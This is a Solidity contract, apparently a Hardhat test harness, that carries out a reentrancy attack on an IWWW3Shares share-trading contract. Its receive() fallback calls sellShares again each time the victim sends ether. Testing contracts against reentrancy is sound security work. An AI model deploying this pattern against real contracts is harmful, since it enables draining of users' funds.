// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import "../../node_modules/@openzeppelin/contracts/access/Ownable.sol";
import "../interfaces/IWWW3Shares.sol";
import "hardhat/console.sol";

contract Reentrant is Ownable {
    IWWW3Shares victim;

    constructor(IWWW3Shares _victim) {
        victim = _victim;
    }

    function buyShares() public payable {
        victim.buyShares{value: 1200000000000000}(2 ether);
    }

    function sellShares() public payable {
        approveVictim();
        uint256 allowance = victim.allowance(address(this), address(victim));
        console.log(allowance);
        console.log(address(this));
        victim.sellShares(1 ether);
    }

    function approveVictim() public{
        victim.approve(address(victim), 2 ether);
    }

    receive() external payable {
     
        victim.sellShares(1 ether);
    }
}
